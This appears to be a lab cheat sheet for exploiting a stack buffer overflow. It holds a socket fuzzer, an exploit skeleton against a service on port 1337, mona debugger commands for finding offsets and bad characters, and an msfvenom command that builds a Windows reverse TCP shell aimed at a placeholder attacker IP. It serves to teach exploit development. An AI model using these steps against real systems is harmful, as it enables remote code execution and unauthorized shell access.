# Scripts

fuzzer.py

```
#!/usr/bin/env python3

import socket, time, sys

ip = "10.10.102.208"

port = 1337
timeout = 5
prefix = "OVERFLOW1 "

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
```

exploit.py

```
import socket

ip = "10.10.102.208"
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

# Pattern

```
python -c "print('A'*10000, file=open('fuzz.wav', 'w'))"
python -c "print('A'*10000)"
/usr/bin/msf-pattern_create -l 5000
```

# Mona

```
# Configuración del directorio
!mona config -set workingfolder c:\mona\%p

# Comparar distancia
!mona findmsp -distance 600

# Encontrar malos personajes
!mona bytearray -b "\x00"

# Comparar carácteres
!mona compare -f C:\mona\oscp\bytearray.bin -a <ESP address>

# Encontrar jmp esp
!mona jmp -r esp -cpb "\x00" # El resultado va a en retn pero al revés (Little Endian)
```

Generar cadena de carácteres incorrectos con Pyhon:

```
for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
```

## Generar carga útil

```
msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00\x07\x08\x2e\x2f\xa0\xa1" -f c 
```